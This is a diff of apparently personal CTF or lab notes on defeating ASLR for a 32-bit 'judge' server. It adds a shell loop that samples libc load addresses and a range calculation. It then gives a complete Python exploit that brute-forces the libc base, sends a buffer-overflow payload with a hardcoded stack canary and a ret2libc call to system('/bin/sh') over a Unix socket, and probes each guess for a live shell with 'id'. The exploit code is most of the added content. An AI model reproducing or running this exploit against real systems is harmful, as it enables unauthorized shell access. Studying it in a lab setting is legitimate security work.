@@ -138,4 +138,89 @@ https://oliviagallucci.com/aslr-bypass-techniques-and-circumvention-impacts/
 
 The addresses shown (`0xf7f77000`, `0xf7f65000`, `0xf7d1d000`, etc.) are from **this specific run of `ldd`**, not from the actual `judge` server process. Every process gets its own independent ASLR randomization — `ldd`'s mmap layout has nothing to do with the judge server's mmap layout, even though it's the same binary and same libraries. So you can't take `0xf7d1d000` and just use it as `libc_base` in your exploit; it'll almost certainly be wrong for the actual running server.
 
-## Trying the partial overwrite 
+## Confirming the ASLR 
+
+![[Pasted image 20260711160023.png]]
+
+![[Pasted image 20260711160928.png]]
+
+The confirm range 0xf7f. use `0xf7` as your fixed high byte
+All ten values share the top byte `0xf7`
+
+## Range Analysis 
+
+I ran this 
+
+for i in {1..500}; do ldd $(which judge) 2>/dev/null | grep libc; done | awk -F'[()]' '{print $2}' | sort -u
+
+- **Min**: `0xf7c6b000`
+- **Max**: `0xf7d68000`
+- **Difference**: `0xf7d68000 - 0xf7c6b000 = 0xfd000`
+- **In pages**: `0xfd000 / 0x1000 = 253` pages
+
+
+```python 
+
+import socket
+import struct
+import time
+
+SYSTEM_OFFSET = 0x000528b0
+BINSH_OFFSET  = 0x001d3808
+
+CANARY = 0x00a221a5
+
+FLOOR = 0xf7c60000
+CEIL  = 0xf7d70000
+STEP  = 0x1000
+NUM_GUESSES = (CEIL - FLOOR) // STEP
+
+SOCK_PATH = "~/judge_sock"  # adjust to your actual path
+
+def p32(val):
+    return struct.pack("<I", val)  # little-endian 4-byte pack
+
+def try_base(fake_base):
+    system_addr = fake_base + SYSTEM_OFFSET
+    binsh_addr  = fake_base + BINSH_OFFSET
+
+    payload  = b"A" * 255
+    payload += p32(CANARY)
+    payload += b"B" * 4
+    payload += p32(system_addr)
+    payload += p32(0x41414141)
+    payload += p32(binsh_addr)
+
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.settimeout(1)
+    try:
+        s.connect(SOCK_PATH)
+        s.sendall(payload)
+
+        # follow-up command to detect a live shell
+        try:
+            s.sendall(b"id\n")
+        except (BrokenPipeError, OSError):
+            s.close()
+            return None
+
+        try:
+            resp = s.recv(4096)
+        except socket.timeout:
+            resp = b""
+
+        s.close()
+        return resp
+    except (ConnectionRefusedError, OSError):
+        try:
+            s.close()
+        except Exception:
+            pass
+        return None
+
+for n in range(NUM_GUESSES):
+    fake_base = FLOOR + (n * STEP)
+    resp = try_base(fake_base)
+    print(f"[{n}] base={hex(fake_base)} resp={resp!r}")
+    time.sleep(0.02)
+```
